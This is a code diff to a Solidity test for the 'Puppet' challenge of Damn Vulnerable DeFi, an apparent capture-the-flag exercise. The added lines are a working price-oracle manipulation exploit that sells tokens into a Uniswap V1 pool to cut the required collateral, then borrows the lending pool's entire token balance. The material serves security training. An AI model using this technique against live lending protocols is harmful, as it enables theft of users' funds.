@@ -7,6 +7,8 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
 
+// ref: https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L65
+// ref: https://docs.uniswap.org/contracts/v1/overview
 interface UniswapV1Exchange {
     function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
         external
@@ -101,6 +103,15 @@ contract Puppet is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, DEADLINE);
+
+        uint256 depoistRequired = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit required should be around 20 ETH (instead of 20_000 ETH!): ", depoistRequired);
+
+        puppetPool.borrow{value: depoistRequired}(POOL_INITIAL_TOKEN_BALANCE);
+
         /**
          * EXPLOIT END *
          */
@@ -117,6 +128,7 @@ contract Puppet is Test {
     // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
     function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
         internal
+        pure
         returns (uint256)
     {
         uint256 input_amount_with_fee = input_amount * 997;
